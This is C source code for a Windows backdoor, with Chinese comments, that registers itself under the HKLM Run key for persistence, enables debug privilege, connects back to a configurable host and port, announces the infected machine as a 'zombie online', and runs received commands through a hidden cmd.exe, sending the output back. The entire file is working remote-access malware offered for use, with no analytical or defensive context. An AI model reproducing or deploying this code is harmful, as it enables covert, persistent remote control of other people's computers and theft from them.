#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<winsock2.h>
#include<stdlib.h>
#include<conio.h>
#include<Windows.h>
#include<TlHelp32.h>
#pragma warning(disable:4996)//无视警告
#pragma comment(lib, "ws2_32.lib") 

char* a = NULL; //路径

//写入注册表
int 注册表写入() {
	HKEY hkey;
	if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey)) {//判断打开注册表是否成功(KEY_ALL_ACCESS为所有权限)，32位的程序并不能成功添加要加上KEY_WOW64_64KEY
		GetLastError();//错误放eax寄存器
		return FALSE;
	}
	//注意！！！RegSetValueExA与RegSetValueEx字符集不一样，带A表示为ascii码，不带a表示unicode，ascii为1个字节，unicode表示2个字节，不同字节的表示的路径不一样，就容易导致出错。！！！！！
	if (ERROR_SUCCESS != RegSetValueExA(hkey, "Enabled", 0, REG_SZ, a, strlen(a) + 1)) {
		RegCloseKey(hkey);//关闭
		GetLastError();//错误放eax寄存器
		printf("%s", "set fail");
		return FALSE;
	}
	RegCloseKey(hkey);//关闭
	//MessageBoxA(0, 0, "设置成功", MB_OK);
}

int 进程提权() {
	int flag = 0;//判断是否提权成功
	HANDLE 进程访问令牌;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &进程访问令牌)) {//打开进程访问令牌
		TOKEN_PRIVILEGES 令牌权限;//令牌权限结构体
		令牌权限.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &令牌权限.Privileges[0].Luid);//遍历权限
		令牌权限.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;//开启特权
		if (AdjustTokenPrivileges(进程访问令牌, FALSE, &令牌权限, sizeof(令牌权限), NULL, NULL)) {//判断权限是否改动成功
			flag = 1;
		}
	}
	CloseHandle(进程访问令牌);//关闭进程访问令牌
	return flag;
}

void 服务器() {
	WORD version = MAKEWORD(2, 2);//库版本号
	WSADATA wsdata;//结构体
	//WSAStartup(version, &wsdata);//返回值为0加载成功，1返回失败
	if (WSAStartup(version, &wsdata)) {
		printf("加载失败");
		return;
	}
	SOCKET sock;
	//套接字结构体
	SOCKADDR_IN info;//ip地址格式， 端口号，ip地址
	info.sin_family = AF_INET;//ip地址格式
	info.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//转换IP地址，这里连接远程主机就改
	//INADDR_ANY为绑定本机地址，htonl为转换字节序
	info.sin_port = htons(50056);//转换端口为大端存储
	sock = socket(AF_INET, SOCK_STREAM, 0);//创建套接字

	char buf[1024 * 5] = { 0 };

	while (WSAConnect(sock, &info, sizeof(info), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {//判断连接是否成功
		Sleep(5000);
		continue;
	}

	send(sock, "肉鸡上线", strlen("肉鸡上线"), 0);
	for (char* cmdline[255];; memset(cmdline, 0, sizeof(cmdline))) {//memset清空成0
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead, hWrite;
		//使用匿名管道
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		//创建管道
		CreatePipe(&hRead, &hWrite, &sa, 0);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si);//获取当前进程信息
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;//窗口隐藏
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

		//获取CMD路径
		GetSystemDirectoryA(cmdline, 255);//获取系统路径
		strncat(cmdline, "\\cmd.exe /c ", strlen("\\cmd.exe / c"));//找到cmd.exe完整路径并执行命令
		int len = recv(sock, buf, 1024 * 5, NULL);//获取字节数
		if (len == SOCKET_ERROR) {
			exit(0);
		}
		strncat(cmdline, buf, strlen(buf));//把命令参数复制到cmdline里
		CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);//创建进程
		CloseHandle(hWrite);
		for (int readBytes; ReadFile(hRead, buf, 1024 * 5, &readBytes, NULL);
			memset(buf, 0, 1024 * 5)) {//读取管道字节数，读到readBytes里，并且每次读完清空
			send(sock, buf, strlen(buf), 0);//发送buf内容
		}
	}
}

void main(int argc, char* argv[]) {
	if (进程提权() == 1) {
		a = argv[0];
		注册表写入();
		服务器();
	}
}